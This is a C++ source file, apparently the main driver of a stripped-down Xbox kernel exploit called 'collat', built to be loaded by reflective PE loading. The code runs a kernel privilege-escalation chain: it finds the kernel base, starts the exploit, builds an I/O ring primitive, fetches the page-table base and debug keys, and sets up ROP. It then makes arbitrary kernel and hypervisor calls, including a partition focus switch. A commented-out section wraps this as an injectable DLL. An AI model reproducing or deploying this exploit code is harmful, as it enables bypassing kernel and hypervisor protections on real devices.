/*
*
*   collat: emma's collateral damage exploit, stripped down to the kernel exploit to be loaded into a medium IL process
*           via landaire's reflective PE loader.
*       
*   pretty much, this eliminates the need for a kernel sidechannel and gamescript exploit, leaving us with a higher success rate,
*           and a faster exploit. overall, this just makes prototyping things easier, so it's not really intended for by use normal 
*           users (unless a token dispenser or any other cool service stuff is implemented)
* 
*   fyi: see the `PIPE_NAME` macro for the pipe that all logs are outputted to.
* 
*/

#include <iostream>
#include <spdlog/spdlog.h>
#include <spdlog/sinks/stdout_color_sinks.h>
#include <format>
#include <memory>
//#include <fmt/color.h>

#include "nt_offsets.h"
#include "moduleinfo.h"
#include "kernel.h"
#include "hv.h"

#include "ioring.h"
#include "xbox_defs.h"

#define GINPUT_PIPE_NAME "\\\\.\\pipe\\CollatSIn"
#define GOUTPUT_PIPE_NAME "\\\\.\\pipe\\CollatSOut"

#define _CRT_SECURE_NO_WARNINGS

bool g_Initialized = false;
HANDLE g_MainThread = INVALID_HANDLE_VALUE;

std::string gethex(char* input, size_t size) {
    std::ostringstream hexStream;

    for (size_t i = 0; i < size; ++i) {
        hexStream << std::hex << std::setw(2) << std::setfill('0')
            << (static_cast<int>(static_cast<unsigned char>(input[i])));
        if (i < size - 1) {  // Avoid trailing space
            hexStream << " ";
        }
    }

    return hexStream.str();
}



// would like to use spdlog for logging but for some reason it isnt playing nice with reflective pe loading??
int main(int argc, char* argv[])
{
    //argc = 1;
    //const char* args[] = {"-d"};
    //argv = (char**)args;

    bool skipVersionCheck = false;

    auto logger = spdlog::stdout_color_mt("collat");
    spdlog::set_default_logger(logger);

    spdlog::info("collat-stripped started! (pid: {})", GetCurrentProcessId());

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0) {
            spdlog::set_level(spdlog::level::trace);
            spdlog::debug("debug logging enabled!");
        }

        if (strcmp(argv[i], "-s") == 0) {
            skipVersionCheck = true;
        }
    }

    int buildRevision = collat::nt::get_build_revision();
    spdlog::info("os build revision: {}", buildRevision);
    if (!collat::nt::build_supported() && !skipVersionCheck) {
        spdlog::critical("uh-oh, you're running an unsupported build!");
        exit(0x70000001);
    }

    if (collat::kmodule::init_module_dictionary() != 0)
        exit(0x70000002);

    void* kernelBase = collat::kmodule::get_base("ntoskrnl.exe");
    spdlog::info("kernel base: {}", kernelBase);


    if (!collat::kernel::init_exploit((uint64_t)kernelBase)) {
        spdlog::critical("kernel exploit failed, aborting!");
        exit(0x70000003);
    }

    collat::kernel::create_ioring();

    collat::kernel::fetch_debug_block_keys(kernelBase);

    collat::kmodule::init_exports_map();

    if (!collat::kernel::fetch_pagetable_base()) {
        spdlog::critical("failed to grab pagetable base address, aborting!");
        exit(0x70000004);
    }

    if (!collat::kernel::init_rop())
        exit(0x70000005);

    spdlog::info("initialization complete, many crashes to follow! :)");
    
    //collat::ioring* ioring = collat::kernel::get_ioring();
    
    uint64_t partitionId = collat::kernel::call<uint64_t>("xvio.sys", "XvioGetCurrentPartitionId");
    spdlog::debug("XvioGetCurrentPartitionId returned: {}", partitionId);


    // should return 0xc0000022 (STATUS_ACCESS_DENIED)
    uint32_t value1, value2;
    uint64_t status = collat::kernel::call<uint64_t>("xvio.sys", "XvioGetPlatformIpAddress", &value1, &value2);
    spdlog::debug("XvioGetPlatformIpAddress status: 0x{:x}", status);

    status = collat::kernel::call<uint64_t>("xvio.sys", "XvioGetPlatformIpAddress", &value1);
    spdlog::debug("XvioGetPlatformIpAddress2 status: 0x{:x}", status);

    //uint64_t physicalAddress = collat::kernel::call<uint64_t>("ntoskrnl.exe", "MmGetPhysicalAddress", &partId);

    //spdlog::debug("partId GPA: 0x{:x}", physicalAddress);

    //spdlog::debug("calling XvioSetFocus(4)");
    //spdlog::debug("XvioSetFocus address: {}", collat::kmodule::get_export("xvio.sys", "XvioSetFocus"));
    //spdlog::debug("XvioSetFocus offset: 0x{:x}", (uint64_t)collat::kmodule::get_export("xvio.sys", "XvioSetFocus") - (uint64_t)collat::kmodule::get_base("xvio.sys"));
    //spdlog::debug("returned 0x{:x}", collat::kernel::call<uint64_t>(collat::kmodule::get_export("xvio.sys", "XvioSetFocus"), 4));

    typedef struct xvio_msg {
        uint32_t pad1;
        uint64_t focus_partition;
        uint32_t idfk;
        uint32_t pad2;
        uint64_t pad3[26];
    };

    xvio_msg msg = { 0 };
    msg.focus_partition = 1;
    msg.idfk = 2;
    
    g_Initialized = true;
   

    uint32_t id = collat::hv::get_partition_id();
    spdlog::info("HvCallGetCurrentPartitionId returned: {}", id);

    //collat::kernel::call<uint64_t>("ntoskrnl.exe", "HvlInvokeHypercall");

    

    // TODO: reimplement post message manually
    spdlog::debug("XvioPostMessage(0xf, 1, 0x11, 0x20, [1,2])");
    status = collat::kernel::call<uint64_t>("xvio.sys", "XvioPostMessage", 0xf, 1, 0x11, 0x20, &msg); // pretty much XvioSetFocus(VM_HOST)
    spdlog::info("XvioPostMessage returned: 0x{:x}", status);

    uint64_t variable = 12;
    uint64_t physicalAddress = collat::kernel::call<uint64_t>("ntoskrnl.exe", "MmGetPhysicalAddress", &variable);
    spdlog::info("MmGetPhysicalAddress returned: 0x{:x}", physicalAddress);

    

    
    
exit:
    collat::kernel::destroy_ioring();
    
    return 0;
}

/*
uint64_t call_64(char* moduleName, char* exportName, int argcnt, uint64_t args[]) {
    std::string mod = std::string(moduleName);
    std::string exp = std::string(exportName);
    std::vector<void*> argsv;
    for (int i = 0; i < argcnt; i++) 
        argsv.push_back((void*)args[i]);
    
    return collat::kernel::callvec(collat::kmodule::get_export(mod, exp), argsv);
}

extern "C" {
    __declspec(dllexport) void clean_up() {
        while (!g_Initialized) {}
        spdlog::debug("cleaning up ioring!");
        collat::kernel::destroy_ioring();
        TerminateThread(g_MainThread, 0);
        spdlog::debug("all good!");
    }

    __declspec(dllexport) UINT64 call64(char* moduleName, char* exportName, int argcnt, UINT64 args[]) {
        while (!g_Initialized) {}
        return call_64(moduleName, exportName, argcnt, args);
    }

    __declspec(dllexport) void test() {
        while (!g_Initialized) {}
        spdlog::info("testprint!");
    }
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_MainThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)main, nullptr, 0, nullptr);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        collat::kernel::destroy_ioring();
        break;
    }
    return TRUE;
}

*/